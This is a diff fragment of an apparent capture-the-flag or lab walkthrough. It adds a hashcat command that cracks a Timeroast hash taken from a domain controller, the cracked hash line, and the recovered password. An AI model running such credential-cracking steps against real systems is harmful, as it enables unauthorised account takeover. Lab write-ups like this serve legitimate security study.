@@ -230,6 +230,16 @@ TIMEROAST   10.0.29.162     445    DC01             1103:$sntp-ms$53f13f15a697cb
 Ill place these hashes into a text file!
 
 ```python
+hashcat -m 31300 timeroast.hash /usr/share/wordlists/rockyou.txt
 
+$sntp-ms$53f13f15a697cb399576d35a20bd875a$1c0111e900000000000a08444c4f434cee1b34d9645c5062e1b8428bffbfcd0aee1b3fbf4085172bee1b3fbf40856cbb:supercalifradualisticexpialidoutious
 ```
+
+Found a password
+
+```python
+supercalifradualisticexpialidoutious
+```
+
+
 
